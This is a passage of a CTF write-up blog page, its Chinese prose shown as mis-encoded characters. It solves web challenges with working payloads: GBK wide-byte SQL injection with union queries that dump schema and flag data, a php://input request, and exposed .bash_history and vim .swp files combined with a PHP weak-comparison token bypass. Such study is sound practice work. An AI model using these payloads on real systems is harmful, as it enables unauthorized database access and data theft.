<p>å½“ä¼ å…¥çš„å•å¼•å·ä¼šè¢«åæ–œæ è½¬ä¹‰çš„æ—¶å€™ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‰¹ä¾‹ï¼Œé‚£å°±æ˜¯æ•°æ®åº“çš„ç¼–ç ä¸ºGBKæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå®½å­—èŠ‚çš„æ ¼å¼æ˜¯åœ¨åœ°å€åé¢å…ˆåŠ ä¸€ä¸ª%dfï¼Œå†åŠ å•å¼•å·ï¼Œå› ä¸º<strong>åæ–œæ çš„ç¼–ç ä¸º%5c</strong>ï¼Œç„¶è€Œå†GBKç¼–ç ä¸­ï¼Œ<strong>%df%5cæ˜¯ç¹ä½“å­—â€œè¬°â€</strong>ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ï¼Œå•å¼•å·å°±ä¸ä¼šè¢«åæ–œæ è½¬ä¹‰ï¼Œé€ æˆæ³¨å…¥ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164611.png" alt="img"  /></p>
<p>è¾“å…¥%dfä¹‹åï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164617.png" alt="img"  /></p>
<p>æ­¤æ—¶å·²ç»é€ æˆäº†æ³¨å…¥ï¼›</p>
<p>å…ˆä½¿ç”¨order byè¯­å¥æŸ¥è¯¢å‡ºè¡¨ä¸­æœ‰å¤šå°‘åˆ—ï¼š</p>
<pre><code>id=1%df%27+order+by+2%23   //ä¸æŠ¥é”™
id=1%df%27+order+by+3%23   //æŠ¥é”™ï¼Œåˆ¤æ–­åˆ—æ•°ä¸º2
</code></pre><p>æˆ–è€…ä½¿ç”¨unionæŸ¥è¯¢ï¼š</p>
<pre><code>id=1%df%27+union+select+null,null%23          //ä¸æŠ¥é”™
id=1%df%27+union+select+null,null,null%23     //æŠ¥é”™ï¼Œåˆ¤æ–­åˆ—æ•°ä¸º2
</code></pre><p>éšåå¯å°†nullæ¢æˆæŸ¥è¯¢è¯­å¥ï¼Œæƒ³è¦unionæŸ¥è¯¢åˆ°æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„è¯­å¥ï¼Œéœ€è¦æŠŠ1æ¢æˆ-1ï¼Œ</p>
<p>å› ä¸ºå•å¼•å·è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åµŒå¥—æŸ¥è¯¢ï¼š</p>
<pre><code>-1%df%27%20union+select+null,(select+table_name+from+information_schema.tables+where+table_schema=(select+database())limit+0,1)%23
</code></pre><p>è¿™å¥å¯ä»¥æŸ¥åˆ°è¡¨åï¼Œä½†æ˜¯åªèƒ½æ’ä¸€ä¸ªï¼Œæƒ³è¦æŸ¥åˆ°å…¶ä»–çš„éœ€è¦æ›´æ”¹limitçš„å€¼</p>
<pre><code>-1%df%27%20union+select+null,(select+column_name+from+information_schema.columns+where+table_schema=(select+database())+and+table_name=(select+table_name+from+information_schema.tables+where+table_schema=(select+database())+limit+0,1)+limit+1,2)%23
</code></pre><p>è¿™å¥å¯ä»¥æŸ¥åˆ°å­—æ®µåï¼›</p>
<p>ä½†æ˜¯è¿™é“é¢˜æˆ‘ä»¬ä¸æ¨èè¿™ä¸ªåµŒå¥—æŸ¥è¯¢çš„æ–¹æ³•ã€‚</p>
<p>æœ‰ä¸€ä¸ªç³»ç»Ÿè‡ªå¸¦çš„å‡½æ•°ï¼šgroup_concat()ï¼ˆä¸€èˆ¬æ˜¯CTFä¸­å¸¸ç”¨çš„ï¼‰:</p>
<pre><code>id=-1%df%27%20union+select+null,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23
</code></pre><p><img src="http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-7.png" alt="img"  /></p>
<p>ç›´æ¥æŸ¥åˆ°äº†æ‰€æœ‰è¡¨åï¼›</p>
<p>è™½ç„¶å•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡çš„æ–¹æ³•ï¼š</p>
<pre><code>id=-1%df%27%20union+select+null,group_concat(column_name)+from+information_schema.columns+where+table_name=0x6e657773%23
</code></pre><p><img src="http://wh1sper.com/wp-content/uploads/2020/02/GBK_injection-8.png" alt="img"  /></p>
<p>ç›´æ¥æŸ¥åˆ°äº†newsï¼ˆ0x6e657773ï¼‰è¡¨ä¸­æ‰€æœ‰å­—æ®µåï¼›</p>
<p>åœ¨è¿™ä¹‹åï¼Œå¯ä»¥æŠŠunionä¸­çš„nullæ›¿æ¢ä¸ºæŸ¥è¯¢è¯­å¥</p>
<p>select å­—æ®µå from è¡¨å</p>
<pre><code>id=-1%df%27%20union%20select%20null,flag%20from%20ctf4%23
</code></pre><p>å½“ç„¶å…¶ä»–çš„è¡¨å­˜åœ¨å‡çš„flagï¼Œè¿™ä¸ªæ‰æ˜¯çœŸçš„ï¼›</p>
<p>flag{this_is_sqli_flag}</p>
<h3 id="file_get_contentshttpchinaloversinaappcomweb23"><a class="link" href="http://chinalover.sinaapp.com/web23/"  target="_blank" rel="noopener"
    >file_get_contents</a></h3>
<p>çŸ¥è¯†ç‚¹ï¼šphp://inputè®¿é—®POSTè¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ</p>
<p>è®¿é—®é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç ï¼š</p>
<pre><code>&lt;!--$file = $_GET['file'];
if(@file_get_contents($file) == &quot;meizijiu&quot;){
    echo $nctf;
}--&gt;
</code></pre><p>è¿™é‡Œä½¿ç”¨PHPä¼ªåè®®php://inputè®¿é—®æœªå¤„ç†è¿‡çš„POSTæ•°æ®ï¼š</p>
<p>burp suiteå‘åŒ…ï¼š</p>
<pre><code>POST /web23/?file=php://input HTTP/1.1
Host: chinalover.sinaapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 8

meizijiu
</code></pre><p>å¯ä»¥ç›´æ¥å¾—åˆ°flagï¼š</p>
<p>nctf{0b021b88527c69e5}</p>
<h3 id="ç»¼åˆé¢˜httpteamxlcsinaappcomweb3b0b0ad119f425408fc3d45253137d33dindexphp"><a class="link" href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php"  target="_blank" rel="noopener"
    >ç»¼åˆé¢˜</a></h3>
<p>è€ƒç‚¹ï¼šJSFuckã€å‘½ä»¤è®°å½•æ–‡ä»¶.bash_history</p>
<p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸²çš„JSFuckï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164630.png" alt="img"  /></p>
<p>ç›´æ¥å¤åˆ¶åˆ°F12é‡Œé¢çš„æ§åˆ¶å°è¿è¡Œï¼Œå¾—åˆ°ï¼š</p>
<pre><code>1bc29b36f623ba82aaf6724fd3b16718.php
</code></pre><p>ç›´æ¥è®¿é—®è¿™ä¸ªé¡µé¢ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164641.png" alt="img"  /></p>
<p>è¿™é‡Œæ˜¯ä¸€ä¸ªè„‘æ´ï¼Œ</p>
<p>å…¶å®ä»–è¯´TIPåœ¨ä»–è„‘è¢‹é‡Œï¼Œå…¶å®å°±æ˜¯â€œheadâ€ï¼Œæš—ç¤ºäº†<strong>HTTPå¤´</strong>ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164649.png" alt="img"  /></p>
<pre><code>tip: history of bash
</code></pre><h4 id="linuxçš„-ç”¨æˆ·ç›®å½•ä¸‹ä¸‰ä¸ªbashæ–‡ä»¶çš„ä½œç”¨httpsblogcsdnnetu011479200articledetails86501366"><a class="link" href="https://blog.csdn.net/u011479200/article/details/86501366"  target="_blank" rel="noopener"
    >Linuxçš„ ç”¨æˆ·ç›®å½•ä¸‹ä¸‰ä¸ªbashæ–‡ä»¶çš„ä½œç”¨:</a></h4>
<p>(.bash_history,.bash_logout,.bash_profile,.bashrc)</p>
<p>è¿™é‡Œå°±åªè¯´.bash_history:</p>
<ul>
<li>Bash shellåœ¨â€œ~/.bash_historyâ€ï¼ˆâ€œ~/â€è¡¨ç¤ºç”¨æˆ·ç›®å½•ï¼‰æ–‡ä»¶ä¸­ä¿å­˜äº†500æ¡ä½¿ç”¨è¿‡çš„å‘½ä»¤ï¼Œè¿™æ ·èƒ½ä½¿ä½ è¾“å…¥ä½¿ç”¨è¿‡çš„é•¿å‘½ä»¤å˜å¾—å®¹æ˜“ã€‚æ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ã€‚</li>
</ul>
<p>äºæ˜¯æˆ‘ä»¬è®¿é—®.bash_historyè¿™ä¸ªæ–‡ä»¶ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164701.png" alt="img"  /></p>
<p>æˆ‘ä»¬ç»§ç»­è®¿é—®flagbak.zipï¼Œå°±èƒ½ç›´æ¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼Œè§£å‹æ‰“å¼€å°±æ˜¯flagï¼š</p>
<p>nctf{bash_history_means_what}</p>
<h3 id="heading"></h3>
<h3 id="å¯†ç é‡ç½®2httpnctfnuptzjcnweb14"><a class="link" href="http://nctf.nuptzj.cn/web14/"  target="_blank" rel="noopener"
    >å¯†ç é‡ç½®2</a></h3>
<p>è€ƒç‚¹ï¼šLinuxä¸‹viç¼–è¾‘å™¨é€€å‡ºåç•™ä¸‹çš„å¤‡ä»½æ–‡ä»¶ã€å¼±ç±»å‹æ¯”è¾ƒ</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164708.png" alt="img"  /></p>
<p>æŸ¥çœ‹æºç ä¸­å¯ä»¥æ‰¾åˆ°adminçš„é‚®ç®±ï¼Œéšæ„èˆ”ä¸€ä¸ªtokenåæäº¤å¾—åˆ°ä¸€ä¸ªæç¤ºfailçš„é¡µé¢ï¼›</p>
<p>æ ¹æ®é¢˜å¹²çš„æç¤ºï¼Œè¿™ä¸ªæ˜¯ç”¨Linuxä¸‹viç¼–è¾‘å™¨ç¼–è¾‘çš„ï¼›</p>
<ul>
<li>å½“éæ­£å¸¸å…³é—­vimç¼–è¾‘å™¨æ—¶ï¼ˆæ¯”å¦‚ç›´æ¥å…³é—­ç»ˆç«¯æˆ–è€…ç”µè„‘æ–­ç”µï¼‰ï¼Œä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªä¸´æ—¶äº¤æ¢æ–‡ä»¶ï¼Œç”¨æ¥å¤‡ä»½ç¼“å†²åŒºä¸­çš„å†…å®¹ã€‚</li>
<li>éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœä½ å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œè€Œ<strong>åªæ˜¯è¯»å–æ–‡ä»¶ï¼Œæ˜¯ä¸ä¼šäº§ç”Ÿ.swpæ–‡ä»¶çš„</strong>ã€‚</li>
<li>æ„å¤–é€€å‡ºæ—¶ï¼Œå¹¶ä¸ä¼šè¦†ç›–æ—§çš„äº¤æ¢æ–‡ä»¶ï¼Œè€Œæ˜¯ä¼šé‡æ–°ç”Ÿæˆæ–°çš„äº¤æ¢æ–‡ä»¶ã€‚è€ŒåŸæ¥çš„æ–‡ä»¶ä¸­å¹¶ä¸ä¼šæœ‰è¿™æ¬¡çš„ä¿®æ”¹ï¼Œæ–‡ä»¶å†…å®¹è¿˜æ˜¯å’Œæ‰“å¼€æ—¶ä¸€æ ·ã€‚</li>
<li>ä¾‹å¦‚ï¼Œç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸ºâ€œ.file.txt.swpâ€ï¼›å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸ºâ€œ.file.txt.swoâ€çš„äº¤æ¢æ–‡ä»¶ï¼›è€Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸ºâ€œ.file.txt.swnâ€ï¼›ä¾æ­¤ç±»æ¨ã€‚</li>
</ul>
<p>å‚è€ƒï¼šhttps://blog.csdn.net/qq_35405259/article/details/86476663</p>
<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥å»è®¿é—®</p>
<pre><code>http://nctf.nuptzj.cn/web14/.submit.php.swp   //submitå‰é¢ä¸€å®šæœ‰ä¸€ä¸ª&quot;.&quot;
</code></pre><p>å¯ä»¥å¾—åˆ°submité¡µé¢çš„æºç ï¼Œå…¶ä¸­å…³é”®éƒ¨åˆ†æ˜¯ï¼š</p>
<pre><code>if(!empty($token)&amp;&amp;!empty($emailAddress)){
	if(strlen($token)!=10) die('fail');
	if($token!='0') die('fail');
	$sql = &quot;SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'&quot;;
	$r = mysql_query($sql) or die('db error');
	$r = mysql_fetch_assoc($r);
	$r = $r['num'];
	if($r&gt;0){
		echo $flag;
	}else{
		echo &quot;å¤±è´¥äº†å‘€&quot;;
	}
}
</code></pre><p>ç¬¬2ã€3è¡Œå¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬åªéœ€è¦è¾“å…¥token=0000000000ï¼ˆ10ä¸ªï¼‰ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164715.png" alt="img"  /></p>
<p>nctf{thanks_to_cumt_bxs}</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/php%E7%89%B9%E6%80%A7/">PHPç‰¹æ€§</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>

    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="has-image">
    <a href="/p/hgame-2021-writeup/">
        
        
            <div class="article-image">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228093852.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HGAME 2021 Writeup</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/starctf-2021-%E5%A4%8D%E7%8E%B0/">
        
        
            <div class="article-image">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100314.jpeg" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228100314.jpeg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">starCTF 2021 å¤ç°</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/p/%E7%BA%B5%E6%A8%AA%E6%9D%AF-writeup-by-x1ct34m/">
        
        

        <div class="article-details">
            <h2 class="article-title">çºµæ¨ªæ¯ Writeup by X1cT34m</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/p/roarctf-2020/">
        
        

        <div class="article-details">
            <h2 class="article-title">RoarCTF 2020</h2>
        </div>
    </a>
</article>
                
                    
<article class="has-image">
    <a href="/p/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">
        
        
            <div class="article-image">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181429.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181429.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">0xGame2020å‡ºé¢˜ç¬”è®°</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>


    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2019 - 
        
        2021 wh1sper
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer="true"
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer="true"
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >
            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
